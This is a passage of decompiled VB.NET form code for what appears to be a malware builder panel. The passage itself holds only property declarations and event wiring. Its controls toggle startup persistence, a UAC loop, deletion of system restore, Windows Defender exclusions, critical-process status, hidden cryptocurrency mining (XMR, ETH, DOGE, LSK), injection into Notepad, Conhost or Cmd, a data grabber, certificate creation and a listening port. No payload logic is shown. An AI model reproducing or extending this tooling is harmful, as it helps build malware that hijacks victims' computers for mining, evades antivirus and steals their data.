		Friend Overridable Property Label30 As Label

		' Token: 0x17000404 RID: 1028
		' (get) Token: 0x060009EF RID: 2543 RVA: 0x0006D862 File Offset: 0x0006BA62
		' (set) Token: 0x060009F0 RID: 2544 RVA: 0x0006D86C File Offset: 0x0006BA6C
		Friend Overridable Property PictureBox21 As System.Windows.Forms.PictureBox

		' Token: 0x17000405 RID: 1029
		' (get) Token: 0x060009F1 RID: 2545 RVA: 0x0006D875 File Offset: 0x0006BA75
		' (set) Token: 0x060009F2 RID: 2546 RVA: 0x0006D87F File Offset: 0x0006BA7F
		Friend Overridable Property EnableStartup As Guna2ToggleSwitch

		' Token: 0x17000406 RID: 1030
		' (get) Token: 0x060009F3 RID: 2547 RVA: 0x0006D888 File Offset: 0x0006BA88
		' (set) Token: 0x060009F4 RID: 2548 RVA: 0x0006D892 File Offset: 0x0006BA92
		Friend Overridable Property Guna2GroupBox7 As Guna2GroupBox

		' Token: 0x17000407 RID: 1031
		' (get) Token: 0x060009F5 RID: 2549 RVA: 0x0006D89B File Offset: 0x0006BA9B
		' (set) Token: 0x060009F6 RID: 2550 RVA: 0x0006D8A5 File Offset: 0x0006BAA5
		Friend Overridable Property Label29 As Label

		' Token: 0x17000408 RID: 1032
		' (get) Token: 0x060009F7 RID: 2551 RVA: 0x0006D8AE File Offset: 0x0006BAAE
		' (set) Token: 0x060009F8 RID: 2552 RVA: 0x0006D8B8 File Offset: 0x0006BAB8
		Friend Overridable Property PictureBox20 As System.Windows.Forms.PictureBox

		' Token: 0x17000409 RID: 1033
		' (get) Token: 0x060009F9 RID: 2553 RVA: 0x0006D8C1 File Offset: 0x0006BAC1
		' (set) Token: 0x060009FA RID: 2554 RVA: 0x0006D8CB File Offset: 0x0006BACB
		Friend Overridable Property Label41 As Label

		' Token: 0x1700040A RID: 1034
		' (get) Token: 0x060009FB RID: 2555 RVA: 0x0006D8D4 File Offset: 0x0006BAD4
		' (set) Token: 0x060009FC RID: 2556 RVA: 0x0006D8DE File Offset: 0x0006BADE
		Friend Overridable Property UACLOOP As Guna2ToggleSwitch

		' Token: 0x1700040B RID: 1035
		' (get) Token: 0x060009FD RID: 2557 RVA: 0x0006D8E7 File Offset: 0x0006BAE7
		' (set) Token: 0x060009FE RID: 2558 RVA: 0x0006D8F1 File Offset: 0x0006BAF1
		Friend Overridable Property Label40 As Label

		' Token: 0x1700040C RID: 1036
		' (get) Token: 0x060009FF RID: 2559 RVA: 0x0006D8FA File Offset: 0x0006BAFA
		' (set) Token: 0x06000A00 RID: 2560 RVA: 0x0006D904 File Offset: 0x0006BB04
		Friend Overridable Property MutexText As Guna2TextBox
			<CompilerGenerated()>
			Get
				Return Me._MutexText
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2TextBox)
				Dim value2 As EventHandler = AddressOf Me.MutexText_IconRightClick
				Dim mutexText As Guna2TextBox = Me._MutexText
				If mutexText IsNot Nothing Then
					RemoveHandler mutexText.IconRightClick, value2
				End If
				Me._MutexText = value
				mutexText = Me._MutexText
				If mutexText IsNot Nothing Then
					AddHandler mutexText.IconRightClick, value2
				End If
			End Set
		End Property

		' Token: 0x1700040D RID: 1037
		' (get) Token: 0x06000A01 RID: 2561 RVA: 0x0006D947 File Offset: 0x0006BB47
		' (set) Token: 0x06000A02 RID: 2562 RVA: 0x0006D951 File Offset: 0x0006BB51
		Friend Overridable Property Guna2GroupBox12 As Guna2GroupBox

		' Token: 0x1700040E RID: 1038
		' (get) Token: 0x06000A03 RID: 2563 RVA: 0x0006D95A File Offset: 0x0006BB5A
		' (set) Token: 0x06000A04 RID: 2564 RVA: 0x0006D964 File Offset: 0x0006BB64
		Friend Overridable Property Label39 As Label

		' Token: 0x1700040F RID: 1039
		' (get) Token: 0x06000A05 RID: 2565 RVA: 0x0006D96D File Offset: 0x0006BB6D
		' (set) Token: 0x06000A06 RID: 2566 RVA: 0x0006D977 File Offset: 0x0006BB77
		Friend Overridable Property PictureBox25 As System.Windows.Forms.PictureBox

		' Token: 0x17000410 RID: 1040
		' (get) Token: 0x06000A07 RID: 2567 RVA: 0x0006D980 File Offset: 0x0006BB80
		' (set) Token: 0x06000A08 RID: 2568 RVA: 0x0006D98A File Offset: 0x0006BB8A
		Friend Overridable Property Guna2GroupBox15 As Guna2GroupBox

		' Token: 0x17000411 RID: 1041
		' (get) Token: 0x06000A09 RID: 2569 RVA: 0x0006D993 File Offset: 0x0006BB93
		' (set) Token: 0x06000A0A RID: 2570 RVA: 0x0006D99D File Offset: 0x0006BB9D
		Friend Overridable Property Label14 As Label

		' Token: 0x17000412 RID: 1042
		' (get) Token: 0x06000A0B RID: 2571 RVA: 0x0006D9A6 File Offset: 0x0006BBA6
		' (set) Token: 0x06000A0C RID: 2572 RVA: 0x0006D9B0 File Offset: 0x0006BBB0
		Friend Overridable Property PictureBox30 As System.Windows.Forms.PictureBox

		' Token: 0x17000413 RID: 1043
		' (get) Token: 0x06000A0D RID: 2573 RVA: 0x0006D9B9 File Offset: 0x0006BBB9
		' (set) Token: 0x06000A0E RID: 2574 RVA: 0x0006D9C3 File Offset: 0x0006BBC3
		Friend Overridable Property DeleteSystemRestore As Guna2ToggleSwitch

		' Token: 0x17000414 RID: 1044
		' (get) Token: 0x06000A0F RID: 2575 RVA: 0x0006D9CC File Offset: 0x0006BBCC
		' (set) Token: 0x06000A10 RID: 2576 RVA: 0x0006D9D6 File Offset: 0x0006BBD6
		Friend Overridable Property Label46 As Label

		' Token: 0x17000415 RID: 1045
		' (get) Token: 0x06000A11 RID: 2577 RVA: 0x0006D9DF File Offset: 0x0006BBDF
		' (set) Token: 0x06000A12 RID: 2578 RVA: 0x0006D9E9 File Offset: 0x0006BBE9
		Friend Overridable Property Guna2GroupBox14 As Guna2GroupBox

		' Token: 0x17000416 RID: 1046
		' (get) Token: 0x06000A13 RID: 2579 RVA: 0x0006D9F2 File Offset: 0x0006BBF2
		' (set) Token: 0x06000A14 RID: 2580 RVA: 0x0006D9FC File Offset: 0x0006BBFC
		Friend Overridable Property PictureBox31 As System.Windows.Forms.PictureBox

		' Token: 0x17000417 RID: 1047
		' (get) Token: 0x06000A15 RID: 2581 RVA: 0x0006DA05 File Offset: 0x0006BC05
		' (set) Token: 0x06000A16 RID: 2582 RVA: 0x0006DA0F File Offset: 0x0006BC0F
		Friend Overridable Property Label43 As Label

		' Token: 0x17000418 RID: 1048
		' (get) Token: 0x06000A17 RID: 2583 RVA: 0x0006DA18 File Offset: 0x0006BC18
		' (set) Token: 0x06000A18 RID: 2584 RVA: 0x0006DA22 File Offset: 0x0006BC22
		Friend Overridable Property PictureBox28 As System.Windows.Forms.PictureBox

		' Token: 0x17000419 RID: 1049
		' (get) Token: 0x06000A19 RID: 2585 RVA: 0x0006DA2B File Offset: 0x0006BC2B
		' (set) Token: 0x06000A1A RID: 2586 RVA: 0x0006DA35 File Offset: 0x0006BC35
		Friend Overridable Property WD_Exclusions As Guna2ToggleSwitch

		' Token: 0x1700041A RID: 1050
		' (get) Token: 0x06000A1B RID: 2587 RVA: 0x0006DA3E File Offset: 0x0006BC3E
		' (set) Token: 0x06000A1C RID: 2588 RVA: 0x0006DA48 File Offset: 0x0006BC48
		Friend Overridable Property Label44 As Label

		' Token: 0x1700041B RID: 1051
		' (get) Token: 0x06000A1D RID: 2589 RVA: 0x0006DA51 File Offset: 0x0006BC51
		' (set) Token: 0x06000A1E RID: 2590 RVA: 0x0006DA5B File Offset: 0x0006BC5B
		Friend Overridable Property Guna2GroupBox13 As Guna2GroupBox

		' Token: 0x1700041C RID: 1052
		' (get) Token: 0x06000A1F RID: 2591 RVA: 0x0006DA64 File Offset: 0x0006BC64
		' (set) Token: 0x06000A20 RID: 2592 RVA: 0x0006DA6E File Offset: 0x0006BC6E
		Friend Overridable Property PictureBox29 As System.Windows.Forms.PictureBox

		' Token: 0x1700041D RID: 1053
		' (get) Token: 0x06000A21 RID: 2593 RVA: 0x0006DA77 File Offset: 0x0006BC77
		' (set) Token: 0x06000A22 RID: 2594 RVA: 0x0006DA81 File Offset: 0x0006BC81
		Friend Overridable Property ProcessCritical As Guna2ToggleSwitch

		' Token: 0x1700041E RID: 1054
		' (get) Token: 0x06000A23 RID: 2595 RVA: 0x0006DA8A File Offset: 0x0006BC8A
		' (set) Token: 0x06000A24 RID: 2596 RVA: 0x0006DA94 File Offset: 0x0006BC94
		Friend Overridable Property Label45 As Label

		' Token: 0x1700041F RID: 1055
		' (get) Token: 0x06000A25 RID: 2597 RVA: 0x0006DA9D File Offset: 0x0006BC9D
		' (set) Token: 0x06000A26 RID: 2598 RVA: 0x0006DAA7 File Offset: 0x0006BCA7
		Friend Overridable Property Label42 As Label

		' Token: 0x17000420 RID: 1056
		' (get) Token: 0x06000A27 RID: 2599 RVA: 0x0006DAB0 File Offset: 0x0006BCB0
		' (set) Token: 0x06000A28 RID: 2600 RVA: 0x0006DABA File Offset: 0x0006BCBA
		Friend Overridable Property PictureBox27 As System.Windows.Forms.PictureBox

		' Token: 0x17000421 RID: 1057
		' (get) Token: 0x06000A29 RID: 2601 RVA: 0x0006DAC3 File Offset: 0x0006BCC3
		' (set) Token: 0x06000A2A RID: 2602 RVA: 0x0006DACD File Offset: 0x0006BCCD
		Friend Overridable Property PictureBox26 As System.Windows.Forms.PictureBox

		' Token: 0x17000422 RID: 1058
		' (get) Token: 0x06000A2B RID: 2603 RVA: 0x0006DAD6 File Offset: 0x0006BCD6
		' (set) Token: 0x06000A2C RID: 2604 RVA: 0x0006DAE0 File Offset: 0x0006BCE0
		Friend Overridable Property Guna2HtmlLabel19 As Guna2HtmlLabel

		' Token: 0x17000423 RID: 1059
		' (get) Token: 0x06000A2D RID: 2605 RVA: 0x0006DAE9 File Offset: 0x0006BCE9
		' (set) Token: 0x06000A2E RID: 2606 RVA: 0x0006DAF3 File Offset: 0x0006BCF3
		Friend Overridable Property Guna2HtmlLabel21 As Guna2HtmlLabel

		' Token: 0x17000424 RID: 1060
		' (get) Token: 0x06000A2F RID: 2607 RVA: 0x0006DAFC File Offset: 0x0006BCFC
		' (set) Token: 0x06000A30 RID: 2608 RVA: 0x0006DB06 File Offset: 0x0006BD06
		Friend Overridable Property PictureBox32 As System.Windows.Forms.PictureBox

		' Token: 0x17000425 RID: 1061
		' (get) Token: 0x06000A31 RID: 2609 RVA: 0x0006DB0F File Offset: 0x0006BD0F
		' (set) Token: 0x06000A32 RID: 2610 RVA: 0x0006DB19 File Offset: 0x0006BD19
		Friend Overridable Property PanelCPUmax As Guna2GroupBox

		' Token: 0x17000426 RID: 1062
		' (get) Token: 0x06000A33 RID: 2611 RVA: 0x0006DB22 File Offset: 0x0006BD22
		' (set) Token: 0x06000A34 RID: 2612 RVA: 0x0006DB2C File Offset: 0x0006BD2C
		Friend Overridable Property Label13 As Label

		' Token: 0x17000427 RID: 1063
		' (get) Token: 0x06000A35 RID: 2613 RVA: 0x0006DB35 File Offset: 0x0006BD35
		' (set) Token: 0x06000A36 RID: 2614 RVA: 0x0006DB3F File Offset: 0x0006BD3F
		Friend Overridable Property PictureBox38 As System.Windows.Forms.PictureBox

		' Token: 0x17000428 RID: 1064
		' (get) Token: 0x06000A37 RID: 2615 RVA: 0x0006DB48 File Offset: 0x0006BD48
		' (set) Token: 0x06000A38 RID: 2616 RVA: 0x0006DB52 File Offset: 0x0006BD52
		Friend Overridable Property Guna2GroupBox21 As Guna2GroupBox

		' Token: 0x17000429 RID: 1065
		' (get) Token: 0x06000A39 RID: 2617 RVA: 0x0006DB5B File Offset: 0x0006BD5B
		' (set) Token: 0x06000A3A RID: 2618 RVA: 0x0006DB65 File Offset: 0x0006BD65
		Friend Overridable Property PictureBox39 As System.Windows.Forms.PictureBox

		' Token: 0x1700042A RID: 1066
		' (get) Token: 0x06000A3B RID: 2619 RVA: 0x0006DB6E File Offset: 0x0006BD6E
		' (set) Token: 0x06000A3C RID: 2620 RVA: 0x0006DB78 File Offset: 0x0006BD78
		Friend Overridable Property Guna2GroupBox20 As Guna2GroupBox

		' Token: 0x1700042B RID: 1067
		' (get) Token: 0x06000A3D RID: 2621 RVA: 0x0006DB81 File Offset: 0x0006BD81
		' (set) Token: 0x06000A3E RID: 2622 RVA: 0x0006DB8B File Offset: 0x0006BD8B
		Friend Overridable Property Label8 As Label

		' Token: 0x1700042C RID: 1068
		' (get) Token: 0x06000A3F RID: 2623 RVA: 0x0006DB94 File Offset: 0x0006BD94
		' (set) Token: 0x06000A40 RID: 2624 RVA: 0x0006DB9E File Offset: 0x0006BD9E
		Friend Overridable Property PictureBox37 As System.Windows.Forms.PictureBox

		' Token: 0x1700042D RID: 1069
		' (get) Token: 0x06000A41 RID: 2625 RVA: 0x0006DBA7 File Offset: 0x0006BDA7
		' (set) Token: 0x06000A42 RID: 2626 RVA: 0x0006DBB1 File Offset: 0x0006BDB1
		Friend Overridable Property PictureBox36 As System.Windows.Forms.PictureBox

		' Token: 0x1700042E RID: 1070
		' (get) Token: 0x06000A43 RID: 2627 RVA: 0x0006DBBA File Offset: 0x0006BDBA
		' (set) Token: 0x06000A44 RID: 2628 RVA: 0x0006DBC4 File Offset: 0x0006BDC4
		Friend Overridable Property PictureBox33 As System.Windows.Forms.PictureBox

		' Token: 0x1700042F RID: 1071
		' (get) Token: 0x06000A45 RID: 2629 RVA: 0x0006DBCD File Offset: 0x0006BDCD
		' (set) Token: 0x06000A46 RID: 2630 RVA: 0x0006DBD7 File Offset: 0x0006BDD7
		Friend Overridable Property Guna2HtmlLabel23 As Guna2HtmlLabel

		' Token: 0x17000430 RID: 1072
		' (get) Token: 0x06000A47 RID: 2631 RVA: 0x0006DBE0 File Offset: 0x0006BDE0
		' (set) Token: 0x06000A48 RID: 2632 RVA: 0x0006DBEA File Offset: 0x0006BDEA
		Friend Overridable Property Guna2HtmlLabel24 As Guna2HtmlLabel

		' Token: 0x17000431 RID: 1073
		' (get) Token: 0x06000A49 RID: 2633 RVA: 0x0006DBF3 File Offset: 0x0006BDF3
		' (set) Token: 0x06000A4A RID: 2634 RVA: 0x0006DBFD File Offset: 0x0006BDFD
		Friend Overridable Property PictureBox41 As System.Windows.Forms.PictureBox

		' Token: 0x17000432 RID: 1074
		' (get) Token: 0x06000A4B RID: 2635 RVA: 0x0006DC06 File Offset: 0x0006BE06
		' (set) Token: 0x06000A4C RID: 2636 RVA: 0x0006DC10 File Offset: 0x0006BE10
		Friend Overridable Property ConDOGE As UIRadioButton
			<CompilerGenerated()>
			Get
				Return Me._ConDOGE
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As UIRadioButton)
				Dim value2 As EventHandler = AddressOf Me.ConDOGE_CheckedChanged
				Dim conDOGE As UIRadioButton = Me._ConDOGE
				If conDOGE IsNot Nothing Then
					RemoveHandler conDOGE.CheckedChanged, value2
				End If
				Me._ConDOGE = value
				conDOGE = Me._ConDOGE
				If conDOGE IsNot Nothing Then
					AddHandler conDOGE.CheckedChanged, value2
				End If
			End Set
		End Property

		' Token: 0x17000433 RID: 1075
		' (get) Token: 0x06000A4D RID: 2637 RVA: 0x0006DC53 File Offset: 0x0006BE53
		' (set) Token: 0x06000A4E RID: 2638 RVA: 0x0006DC5D File Offset: 0x0006BE5D
		Friend Overridable Property PictureBox35 As System.Windows.Forms.PictureBox

		' Token: 0x17000434 RID: 1076
		' (get) Token: 0x06000A4F RID: 2639 RVA: 0x0006DC66 File Offset: 0x0006BE66
		' (set) Token: 0x06000A50 RID: 2640 RVA: 0x0006DC70 File Offset: 0x0006BE70
		Friend Overridable Property ConLSK As UIRadioButton
			<CompilerGenerated()>
			Get
				Return Me._ConLSK
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As UIRadioButton)
				Dim value2 As EventHandler = AddressOf Me.ConLSK_CheckedChanged
				Dim conLSK As UIRadioButton = Me._ConLSK
				If conLSK IsNot Nothing Then
					RemoveHandler conLSK.CheckedChanged, value2
				End If
				Me._ConLSK = value
				conLSK = Me._ConLSK
				If conLSK IsNot Nothing Then
					AddHandler conLSK.CheckedChanged, value2
				End If
			End Set
		End Property

		' Token: 0x17000435 RID: 1077
		' (get) Token: 0x06000A51 RID: 2641 RVA: 0x0006DCB3 File Offset: 0x0006BEB3
		' (set) Token: 0x06000A52 RID: 2642 RVA: 0x0006DCBD File Offset: 0x0006BEBD
		Friend Overridable Property PictureBox40 As System.Windows.Forms.PictureBox

		' Token: 0x17000436 RID: 1078
		' (get) Token: 0x06000A53 RID: 2643 RVA: 0x0006DCC6 File Offset: 0x0006BEC6
		' (set) Token: 0x06000A54 RID: 2644 RVA: 0x0006DCD0 File Offset: 0x0006BED0
		Friend Overridable Property ConETH As UIRadioButton
			<CompilerGenerated()>
			Get
				Return Me._ConETH
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As UIRadioButton)
				Dim value2 As EventHandler = AddressOf Me.ConETH_CheckedChanged
				Dim conETH As UIRadioButton = Me._ConETH
				If conETH IsNot Nothing Then
					RemoveHandler conETH.CheckedChanged, value2
				End If
				Me._ConETH = value
				conETH = Me._ConETH
				If conETH IsNot Nothing Then
					AddHandler conETH.CheckedChanged, value2
				End If
			End Set
		End Property

		' Token: 0x17000437 RID: 1079
		' (get) Token: 0x06000A55 RID: 2645 RVA: 0x0006DD13 File Offset: 0x0006BF13
		' (set) Token: 0x06000A56 RID: 2646 RVA: 0x0006DD1D File Offset: 0x0006BF1D
		Friend Overridable Property PictureBox34 As System.Windows.Forms.PictureBox

		' Token: 0x17000438 RID: 1080
		' (get) Token: 0x06000A57 RID: 2647 RVA: 0x0006DD26 File Offset: 0x0006BF26
		' (set) Token: 0x06000A58 RID: 2648 RVA: 0x0006DD30 File Offset: 0x0006BF30
		Friend Overridable Property ConXMR As UIRadioButton
			<CompilerGenerated()>
			Get
				Return Me._ConXMR
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As UIRadioButton)
				Dim value2 As EventHandler = AddressOf Me.ConXMR_CheckedChanged
				Dim conXMR As UIRadioButton = Me._ConXMR
				If conXMR IsNot Nothing Then
					RemoveHandler conXMR.CheckedChanged, value2
				End If
				Me._ConXMR = value
				conXMR = Me._ConXMR
				If conXMR IsNot Nothing Then
					AddHandler conXMR.CheckedChanged, value2
				End If
			End Set
		End Property

		' Token: 0x17000439 RID: 1081
		' (get) Token: 0x06000A59 RID: 2649 RVA: 0x0006DD73 File Offset: 0x0006BF73
		' (set) Token: 0x06000A5A RID: 2650 RVA: 0x0006DD7D File Offset: 0x0006BF7D
		Friend Overridable Property PictureBox11 As System.Windows.Forms.PictureBox

		' Token: 0x1700043A RID: 1082
		' (get) Token: 0x06000A5B RID: 2651 RVA: 0x0006DD86 File Offset: 0x0006BF86
		' (set) Token: 0x06000A5C RID: 2652 RVA: 0x0006DD90 File Offset: 0x0006BF90
		Friend Overridable Property InjectNotepad As UIRadioButton

		' Token: 0x1700043B RID: 1083
		' (get) Token: 0x06000A5D RID: 2653 RVA: 0x0006DD99 File Offset: 0x0006BF99
		' (set) Token: 0x06000A5E RID: 2654 RVA: 0x0006DDA3 File Offset: 0x0006BFA3
		Friend Overridable Property InjectConhost As UIRadioButton

		' Token: 0x1700043C RID: 1084
		' (get) Token: 0x06000A5F RID: 2655 RVA: 0x0006DDAC File Offset: 0x0006BFAC
		' (set) Token: 0x06000A60 RID: 2656 RVA: 0x0006DDB6 File Offset: 0x0006BFB6
		Friend Overridable Property InjectCmd As UIRadioButton

		' Token: 0x1700043D RID: 1085
		' (get) Token: 0x06000A61 RID: 2657 RVA: 0x0006DDBF File Offset: 0x0006BFBF
		' (set) Token: 0x06000A62 RID: 2658 RVA: 0x0006DDCC File Offset: 0x0006BFCC
		Friend Overridable Property EnableMining As Guna2ToggleSwitch
			<CompilerGenerated()>
			Get
				Return Me._EnableMining
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2ToggleSwitch)
				Dim value2 As EventHandler = AddressOf Me.EnableMining_CheckedChanged
				Dim enableMining As Guna2ToggleSwitch = Me._EnableMining
				If enableMining IsNot Nothing Then
					RemoveHandler enableMining.CheckedChanged, value2
				End If
				Me._EnableMining = value
				enableMining = Me._EnableMining
				If enableMining IsNot Nothing Then
					AddHandler enableMining.CheckedChanged, value2
				End If
			End Set
		End Property

		' Token: 0x1700043E RID: 1086
		' (get) Token: 0x06000A63 RID: 2659 RVA: 0x0006DE0F File Offset: 0x0006C00F
		' (set) Token: 0x06000A64 RID: 2660 RVA: 0x0006DE19 File Offset: 0x0006C019
		Friend Overridable Property Label15 As Label

		' Token: 0x1700043F RID: 1087
		' (get) Token: 0x06000A65 RID: 2661 RVA: 0x0006DE22 File Offset: 0x0006C022
		' (set) Token: 0x06000A66 RID: 2662 RVA: 0x0006DE2C File Offset: 0x0006C02C
		Friend Overridable Property MiningL1 As DataGridView

		' Token: 0x17000440 RID: 1088
		' (get) Token: 0x06000A67 RID: 2663 RVA: 0x0006DE35 File Offset: 0x0006C035
		' (set) Token: 0x06000A68 RID: 2664 RVA: 0x0006DE3F File Offset: 0x0006C03F
		Friend Overridable Property IMAGMiningL1 As ImageList

		' Token: 0x17000441 RID: 1089
		' (get) Token: 0x06000A69 RID: 2665 RVA: 0x0006DE48 File Offset: 0x0006C048
		' (set) Token: 0x06000A6A RID: 2666 RVA: 0x0006DE52 File Offset: 0x0006C052
		Friend Overridable Property PictureBox42 As System.Windows.Forms.PictureBox

		' Token: 0x17000442 RID: 1090
		' (get) Token: 0x06000A6B RID: 2667 RVA: 0x0006DE5B File Offset: 0x0006C05B
		' (set) Token: 0x06000A6C RID: 2668 RVA: 0x0006DE65 File Offset: 0x0006C065
		Friend Overridable Property Guna2HtmlLabel36 As Guna2HtmlLabel

		' Token: 0x17000443 RID: 1091
		' (get) Token: 0x06000A6D RID: 2669 RVA: 0x0006DE6E File Offset: 0x0006C06E
		' (set) Token: 0x06000A6E RID: 2670 RVA: 0x0006DE78 File Offset: 0x0006C078
		Friend Overridable Property Guna2GroupBox16 As Guna2GroupBox

		' Token: 0x17000444 RID: 1092
		' (get) Token: 0x06000A6F RID: 2671 RVA: 0x0006DE81 File Offset: 0x0006C081
		' (set) Token: 0x06000A70 RID: 2672 RVA: 0x0006DE8B File Offset: 0x0006C08B
		Friend Overridable Property Label18 As Label

		' Token: 0x17000445 RID: 1093
		' (get) Token: 0x06000A71 RID: 2673 RVA: 0x0006DE94 File Offset: 0x0006C094
		' (set) Token: 0x06000A72 RID: 2674 RVA: 0x0006DE9E File Offset: 0x0006C09E
		Friend Overridable Property Label17 As Label

		' Token: 0x17000446 RID: 1094
		' (get) Token: 0x06000A73 RID: 2675 RVA: 0x0006DEA7 File Offset: 0x0006C0A7
		' (set) Token: 0x06000A74 RID: 2676 RVA: 0x0006DEB1 File Offset: 0x0006C0B1
		Friend Overridable Property PictureBox9 As System.Windows.Forms.PictureBox

		' Token: 0x17000447 RID: 1095
		' (get) Token: 0x06000A75 RID: 2677 RVA: 0x0006DEBA File Offset: 0x0006C0BA
		' (set) Token: 0x06000A76 RID: 2678 RVA: 0x0006DEC4 File Offset: 0x0006C0C4
		Friend Overridable Property EnableGrabber As Guna2ToggleSwitch
			<CompilerGenerated()>
			Get
				Return Me._EnableGrabber
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2ToggleSwitch)
				Dim value2 As EventHandler = AddressOf Me.EnableGrabber_CheckedChanged
				Dim enableGrabber As Guna2ToggleSwitch = Me._EnableGrabber
				If enableGrabber IsNot Nothing Then
					RemoveHandler enableGrabber.CheckedChanged, value2
				End If
				Me._EnableGrabber = value
				enableGrabber = Me._EnableGrabber
				If enableGrabber IsNot Nothing Then
					AddHandler enableGrabber.CheckedChanged, value2
				End If
			End Set
		End Property

		' Token: 0x17000448 RID: 1096
		' (get) Token: 0x06000A77 RID: 2679 RVA: 0x0006DF07 File Offset: 0x0006C107
		' (set) Token: 0x06000A78 RID: 2680 RVA: 0x0006DF11 File Offset: 0x0006C111
		Friend Overridable Property labelPorts As Guna2HtmlLabel

		' Token: 0x17000449 RID: 1097
		' (get) Token: 0x06000A79 RID: 2681 RVA: 0x0006DF1A File Offset: 0x0006C11A
		' (set) Token: 0x06000A7A RID: 2682 RVA: 0x0006DF24 File Offset: 0x0006C124
		Friend Overridable Property Guna2HtmlLabel2 As Guna2HtmlLabel

		' Token: 0x1700044A RID: 1098
		' (get) Token: 0x06000A7B RID: 2683 RVA: 0x0006DF2D File Offset: 0x0006C12D
		' (set) Token: 0x06000A7C RID: 2684 RVA: 0x0006DF38 File Offset: 0x0006C138
		Friend Overridable Property TextBox1 As Guna2TextBox
			<CompilerGenerated()>
			Get
				Return Me._TextBox1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2TextBox)
				Dim value2 As KeyPressEventHandler = AddressOf Me.TextBox1_KeyPress
				Dim value3 As EventHandler = AddressOf Me.TextBox1_IconRightClick
				Dim value4 As EventHandler = AddressOf Me.TextBox1_IconLeftClick
				Dim textBox As Guna2TextBox = Me._TextBox1
				If textBox IsNot Nothing Then
					RemoveHandler textBox.KeyPress, value2
					RemoveHandler textBox.IconRightClick, value3
					RemoveHandler textBox.IconLeftClick, value4
				End If
				Me._TextBox1 = value
				textBox = Me._TextBox1
				If textBox IsNot Nothing Then
					AddHandler textBox.KeyPress, value2
					AddHandler textBox.IconRightClick, value3
					AddHandler textBox.IconLeftClick, value4
				End If
			End Set
		End Property

		' Token: 0x1700044B RID: 1099
		' (get) Token: 0x06000A7D RID: 2685 RVA: 0x0006DFB1 File Offset: 0x0006C1B1
		' (set) Token: 0x06000A7E RID: 2686 RVA: 0x0006DFBC File Offset: 0x0006C1BC
		Friend Overridable Property ButtCreateCertificate As Guna2GradientButton
			<CompilerGenerated()>
			Get
				Return Me._ButtCreateCertificate
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2GradientButton)
				Dim value2 As EventHandler = AddressOf Me.CreateCertificate_Click
				Dim buttCreateCertificate As Guna2GradientButton = Me._ButtCreateCertificate
				If buttCreateCertificate IsNot Nothing Then
					RemoveHandler buttCreateCertificate.Click, value2
				End If
				Me._ButtCreateCertificate = value
				buttCreateCertificate = Me._ButtCreateCertificate
				If buttCreateCertificate IsNot Nothing Then
					AddHandler buttCreateCertificate.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700044C RID: 1100
		' (get) Token: 0x06000A7F RID: 2687 RVA: 0x0006DFFF File Offset: 0x0006C1FF
		' (set) Token: 0x06000A80 RID: 2688 RVA: 0x0006E009 File Offset: 0x0006C209
		Friend Overridable Property Guna2GroupBox28 As Guna2GroupBox

		' Token: 0x1700044D RID: 1101
		' (get) Token: 0x06000A81 RID: 2689 RVA: 0x0006E012 File Offset: 0x0006C212
		' (set) Token: 0x06000A82 RID: 2690 RVA: 0x0006E01C File Offset: 0x0006C21C
		Friend Overridable Property Label19 As Label

		' Token: 0x1700044E RID: 1102
		' (get) Token: 0x06000A83 RID: 2691 RVA: 0x0006E025 File Offset: 0x0006C225
		' (set) Token: 0x06000A84 RID: 2692 RVA: 0x0006E030 File Offset: 0x0006C230
		Friend Overridable Property NameCertificate As Guna2TextBox
			<CompilerGenerated()>
			Get
				Return Me._NameCertificate
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2TextBox)
				Dim value2 As KeyPressEventHandler = AddressOf Me.NameCertificate_KeyPress
				Dim nameCertificate As Guna2TextBox = Me._NameCertificate
				If nameCertificate IsNot Nothing Then
					RemoveHandler nameCertificate.KeyPress, value2
				End If
				Me._NameCertificate = value
				nameCertificate = Me._NameCertificate
				If nameCertificate IsNot Nothing Then
					AddHandler nameCertificate.KeyPress, value2
				End If
			End Set
		End Property

		' Token: 0x1700044F RID: 1103
		' (get) Token: 0x06000A85 RID: 2693 RVA: 0x0006E073 File Offset: 0x0006C273
		' (set) Token: 0x06000A86 RID: 2694 RVA: 0x0006E07D File Offset: 0x0006C27D
		Friend Overridable Property PictureBox53 As System.Windows.Forms.PictureBox

		' Token: 0x17000450 RID: 1104
		' (get) Token: 0x06000A87 RID: 2695 RVA: 0x0006E086 File Offset: 0x0006C286
		' (set) Token: 0x06000A88 RID: 2696 RVA: 0x0006E090 File Offset: 0x0006C290
		Friend Overridable Property Guna2GroupBox17 As Guna2GroupBox

		' Token: 0x17000451 RID: 1105
		' (get) Token: 0x06000A89 RID: 2697 RVA: 0x0006E099 File Offset: 0x0006C299
		' (set) Token: 0x06000A8A RID: 2698 RVA: 0x0006E0A3 File Offset: 0x0006C2A3
		Friend Overridable Property Label20 As Label

		' Token: 0x17000452 RID: 1106
		' (get) Token: 0x06000A8B RID: 2699 RVA: 0x0006E0AC File Offset: 0x0006C2AC
		' (set) Token: 0x06000A8C RID: 2700 RVA: 0x0006E0B6 File Offset: 0x0006C2B6
		Friend Overridable Property PictureBox55 As System.Windows.Forms.PictureBox

		' Token: 0x17000453 RID: 1107
		' (get) Token: 0x06000A8D RID: 2701 RVA: 0x0006E0BF File Offset: 0x0006C2BF
		' (set) Token: 0x06000A8E RID: 2702 RVA: 0x0006E0CC File Offset: 0x0006C2CC
		Friend Overridable Property StartPort As Guna2GradientButton
			<CompilerGenerated()>
			Get
				Return Me._StartPort
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2GradientButton)
